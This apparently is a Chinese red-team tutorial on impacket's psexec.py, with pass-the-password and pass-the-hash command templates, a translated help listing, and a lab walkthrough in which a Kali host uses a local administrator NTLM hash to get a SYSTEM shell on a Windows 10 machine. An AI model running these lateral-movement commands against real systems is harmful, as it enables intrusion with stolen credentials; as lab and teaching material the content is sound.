
# impacket-psexec
<div style="text-align: right;">

date: "2023-12-10"

</div>

## 工具特点
impacket套件内的psexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。

## 基础使用

域环境下传递密码

```shell
python3 psexec.py <domain>/<username>:<password>@<ip> "<command>"
```

本地环境下传递密码

```shell
python3 psexec.py ./<username>:<password>@<ip> "<command>"
```

域环境下传递Hash

```shell
python3 psexec.py -hashes :<hash> <domain>/<username>@<ip> "<command>"
```

本地环境下传递Hash

```shell
python3 psexec.py -hashes :<hash> ./<username>@<ip> "<command>"
```

## 参数说明

```shell
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC]
                 [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]
                 [-dc-ip ip address] [-target-ip ip address] [-port [destination port]]
                 [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command [command ...]]

使用 RemComSvc 的 PSEXEC 类似功能示例。

位置参数:
  target                [[域/]用户名[:密码]@]<目标名称或地址>
  command               命令（如果使用 -c 则为参数）在目标处执行（w/o路径）-（默认：cmd.exe）

可选参数:
  -h, --help            显示此帮助消息并退出
  -c pathname           复制文件名以供以后执行，参数在命令选项
  -path PATH            要执行的命令的 PATH 路径
  -file FILE            替代 RemCom 二进制文件（确保它不需要 CRT）
  -ts                   为每个日志输出添加时间戳
  -debug                打开 DEBUG 输出
  -codec CODEC          设置目标输出中使用的编码（编解码器）（默认“utf-8”）。 如果检测到错误，请在目标上运行 chcp.com，将结果映射到 https://docs.python.org/3/library/codecs.html#standard-encodings，然后使用 -codec 和 -codec 再次执行 smbexec.py 相应的编解码器

认证:
  -hashes LMHASH:NTHASH
                        NTLM 哈希值，格式为 LMHASH:NTHASH
  -no-pass              不询问密码（对于 -k 很有用）
  -k                    使用 Kerberos 身份验证。 根据目标参数从 ccache 文件 (KRB5CCNAME) 获取凭据。 如果找不到有效的凭据，它将使用命令行中指定的凭据
  -aesKey hex key       用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）
  -keytab KEYTAB        从 keytab 文件中读取 SPN 的密钥

连接:
  -dc-ip ip address     域控制器的 IP 地址。 如果省略，它将使用目标参数中指定的域部分 (FQDN)
  -target-ip ip address
                        目标机器的IP地址。 如果省略，它将使用指定为目标的任何内容。 当目标是 NetBIOS 名称并且您无法解析它时，这很有用
  -port [destination port]
                        连接 SMB 服务器的目标端口
  -service-name service_name
                        用于触发负载的服务的名称
  -remote-binary-name remote_binary_name
                        这将是上传到目标上的可执行文件的名称
```

## 实验环境

> 在其它机器上收集到Win10机器的Hash密码进行横向传递

| 机器 | IP | 状态 |
| --- | --- | --- |
| Win10 | 192.168.36.130 | 知道本地管理员用户的Hash值 |
| Kali | 192.168.36.128 |  |

进入全交互式

```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 psexec.py -hashes :579da618cfbfa85247acf1f800a280a4 ./administrator@192.168.36.130         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.36.130.....
[*] Found writable share ADMIN$
[*] Uploading file tRZKjHjb.exe
[*] Opening SVCManager on 192.168.36.130.....
[*] Creating service jgzm on 192.168.36.130.....
[*] Starting service jgzm.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.19042.804]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2020 Microsoft Corporation. ��������Ȩ����


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```

进入半交互式

```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 psexec.py -hashes :579da618cfbfa85247acf1f800a280a4 ./administrator@192.168.36.130 "whoami"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.36.130.....
[*] Found writable share ADMIN$
[*] Uploading file ZZEGogKB.exe
[*] Opening SVCManager on 192.168.36.130.....
[*] Creating service NEHq on 192.168.36.130.....
[*] Starting service NEHq.....
[!] Press help for extra shell commands
nt authority\system
[*] Process whoami finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 192.168.36.130.....
[*] Stopping service NEHq.....
[*] Removing service NEHq.....
[*] Removing file ZZEGogKB.exe.....

```
